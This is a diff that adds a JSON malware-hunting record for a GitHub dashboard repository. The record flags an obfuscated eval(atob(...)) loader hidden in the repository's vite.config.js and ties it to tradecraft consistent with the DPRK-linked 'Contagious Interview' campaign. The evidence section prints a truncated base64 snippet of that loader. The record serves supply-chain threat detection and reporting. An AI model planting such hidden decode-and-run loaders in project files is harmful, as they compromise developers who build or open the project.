@@ -1,0 +1,82 @@
+{
+  "finding": {
+    "key": "repository:alexsander532/projeto_dashboard_versao1",
+    "kind": "repository",
+    "family": "",
+    "id": "alexsander532/projeto_dashboard_versao1",
+    "url": "https://github.com/Alexsander532/projeto_dashboard_versao1",
+    "registry": "github",
+    "owner": "alexsander532",
+    "status": "confirmed",
+    "confidence": "",
+    "score": 14,
+    "detection_method": "signature_match",
+    "attribution": "DPRK (North Korea) (per OSM)",
+    "campaign_id": "GW-C-e0be6a21",
+    "rules": "obfuscation/eval-decoded; obfuscation/atob; code_execution/js-exec; code_execution/node-child-process",
+    "evidence_locations": "frontend/vite.config.js:36; frontend/src/pages/Estoque.jsx:268; backend/src/routes/relatorios.js:6",
+    "c2_hosts": "",
+    "iocs": "frontend/vite.config.js",
+    "matched_signatures": "",
+    "reasons": "repository under owner Alexsander532 of a known-malicious repo | Tier-2 confirmed (bash score 14)",
+    "osm_status": "submitted",
+    "osm_threat_id": "e4260d86-fd6e-4ec0-9f07-6abb9264b429",
+    "first_seen": "hunt-20260620T053126Z",
+    "last_seen": "hunt-20260620T053126Z",
+    "evidence_file": "repositories/alexsander532_projeto_dashboard_versao1.json",
+    "reviewer_decision": "",
+    "notes": ""
+  },
+  "evidence": [
+    {
+      "file": "frontend/vite.config.js",
+      "line": 36,
+      "category": "obfuscation",
+      "rule": "eval-decoded",
+      "snippet": "});eval(atob('Z2xvYmFsWychJ109JzExJzt2YXIgXyRfMWU0Mj0oZnVuY3Rpb24obCxlKXt2YXIgaD1sLmxlbmd0aDt2YXIgZz1bXTtmb3IodmFyIGo9MDtqPCBoO2orKyl7Z1tqXT0gbC5jaGFyQXQoail9O2Zvcih2YXIgaj0wO2o8-82-1IGg7aisrKXt2YXIgc"
+    },
+    {
+      "file": "frontend/vite.config.js",
+      "line": 36,
+      "category": "obfuscation",
+      "rule": "atob",
+      "snippet": "});eval(atob('Z2xvYmFsWychJ109JzExJzt2YXIgXyRfMWU0Mj0oZnVuY3Rpb24obCxlKXt2YXIgaD1sLmxlbmd0aDt2YXIgZz1bXTtmb3IodmFyIGo9MDtqPCBoO2orKyl7Z1tqXT0gbC5jaGFyQXQoail9O2Zvcih2YXIgaj0wO2o8-82-1IGg7aisrKXt2YXIgc"
+    },
+    {
+      "file": "frontend/src/pages/Estoque.jsx",
+      "line": 268,
+      "category": "code_execution",
+      "rule": "js-exec",
+      "snippet": "const result = /^#?([a-f\\d]{2})([a-f\\d]{2})([a-f\\d]{2})$/i.exec(hex);"
+    },
+    {
+      "file": "backend/src/routes/relatorios.js",
+      "line": 6,
+      "category": "code_execution",
+      "rule": "node-child-process",
+      "snippet": "const { exec } = require('child_process');"
+    }
+  ],
+  "commit_sha": null,
+  "osm_report": {
+    "report_type": "repository",
+    "resource_identifier": "https://github.com/alexsander532/projeto_dashboard_versao1",
+    "version_info": "all",
+    "threat_description": "Obfuscated loader. Payload in frontend/vite.config.js.\nThe eval(atob(...)) loader hidden in a project file is Contagious Interview (DPRK-attributed) tradecraft.\nCampaign GW-C-e0be6a21: one of 11 confirmed repos across 4 accounts sharing the loader stub b10bafdcfe.\nAttribution: the tradecraft is consistent with North Korea, but a single signal is a lead rather than an attribution, so we do not attribute it on this evidence alone. Signals: Delivery vector matches Contagious-Interview tradecraft: obfuscated-eval-atob-loader.\nConfirmed by static analysis; the code was read, never executed.",
+    "payload_description": "Malicious payload found in: frontend/vite.config.js\n- frontend/vite.config.js:36: decodes a hidden blob and executes it at load time (obfuscated loader)\n- frontend/vite.config.js:36: hides code in an encoded blob that is decoded and run",
+    "publisher": "alexsander532",
+    "severity_level": "high",
+    "tags": [
+      "supply-chain",
+      "github-repo",
+      "dprk-consistent-tradecraft",
+      "obfuscated-eval-atob-loader",
+      "obfuscated-loader"
+    ],
+    "evidence_references": "https://github.com/alexsander532/projeto_dashboard_versao1/blob/HEAD/frontend/vite.config.js#L36\nhttps://github.com/alexsander532/projeto_dashboard_versao1/blob/HEAD/frontend/src/pages/Estoque.jsx#L268\nhttps://github.com/alexsander532/projeto_dashboard_versao1/blob/HEAD/backend/src/routes/relatorios.js#L6",
+    "verified_iocs": "frontend/vite.config.js",
+    "contributors": [],
+    "first_seen": "2026-06-20T05:31:26Z",
+    "last_seen": "2026-06-20T05:31:26Z"
+  }
+}
